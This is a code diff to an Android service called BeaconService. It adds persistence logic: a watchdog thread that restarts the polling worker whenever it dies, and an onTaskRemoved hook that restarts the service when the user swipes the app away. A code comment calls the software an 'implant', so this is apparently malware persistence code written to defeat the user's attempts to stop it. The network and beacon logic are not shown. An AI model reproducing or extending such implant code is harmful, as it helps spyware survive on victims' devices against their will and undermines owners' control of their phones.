@@ -34,6 +34,7 @@ public class BeaconService extends Service {
     private static volatile BeaconService instance;
     private final Object gate = new Object();
     private Thread worker;
+    private Thread guardian;
     private ThreadPoolExecutor pool;
     private volatile boolean running;
     private volatile boolean awake;
@@ -81,7 +82,9 @@ public class BeaconService extends Service {
             }
         }, "svc-poll");
         worker.start();
+        startGuardian();
         Scheduler.arm(this);
+        Scheduler.kick(this);
     }
 
     @Override
@@ -97,6 +100,48 @@ public class BeaconService extends Service {
         return START_STICKY;
     }
 
+    /**
+     * The poll thread is the pulse. If it dies — an OOM, a wedged socket, a
+     * vendor killing the stack — this brings it back without waiting for the
+     * next alarm. The guardian is deliberately dumb: it only checks liveness.
+     */
+    private void startGuardian() {
+        guardian = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (running) {
+                    try {
+                        Thread.sleep(20000L);
+                    } catch (InterruptedException exc) {
+                        return;
+                    }
+                    Thread current = worker;
+                    if (running && current != null && !current.isAlive()) {
+                        Log.d("guardian restart");
+                        worker = new Thread(new Runnable() {
+                            @Override
+                            public void run() {
+                                loop();
+                            }
+                        }, "svc-poll");
+                        worker.start();
+                    }
+                }
+            }
+        }, "svc-guard");
+        guardian.setDaemon(true);
+        guardian.start();
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        // Swiping the recents card must not end the implant.
+        Scheduler.arm(this);
+        Scheduler.kick(this);
+        BeaconService.start(this);
+        super.onTaskRemoved(rootIntent);
+    }
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
@@ -108,6 +153,9 @@ public class BeaconService extends Service {
         wake();
         if (worker != null) {
             worker.interrupt();
+        }
+        if (guardian != null) {
+            guardian.interrupt();
         }
         if (pool != null) {
             pool.shutdownNow();
